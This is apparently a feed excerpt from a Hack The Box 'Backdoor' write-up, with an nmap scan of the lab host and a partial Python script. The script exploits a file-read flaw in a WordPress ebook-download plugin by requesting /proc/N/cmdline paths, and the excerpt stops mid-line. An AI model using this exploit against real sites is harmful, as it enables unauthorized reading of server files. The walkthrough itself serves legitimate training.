item.title: (HTB) Backdoor
item.description: (HTB) Backdoor Website Enumeration export ip=10.10.11.125 First nmap scan. sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ip -oG ports Results: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4de43384657db4c213b69f3db3c6288 (RSA) | 256 aac9fc210f3ef4ec6b3570262253ef66 (ECDSA) |_ 256 d28be4ec0761aacaf8ec1cf88cc1f6e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Backdoor &#8211; Real-Life |_http-generator: WordPress 5.8.1 1337/tcp open waste?

item.title: Backdoor script
item.description: Backdoor script #!/usr/bin/python3 from pwn import * import requests, signal, time, sys, pdb def def_handler(sig, frame): print("\n exit") sys.exit(1) #def makeRequest(): # Ctrl+C signal.signal(signal.SIGINT, def_handler) # variables main_url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=" def makeRequest(): p1 = log.progress("Brute Force Attack") p1.status("Starting brute force attack") time.sleep(2) for i in range(1, 1000): p1.status("trying with PATH /proc/%s/cmdline" % str(i)) url = main_url + "/proc/" + str(i) + "/cmdline" #print(url) r = requests.get(url) if len(r.content) > 82: print("======================") log.
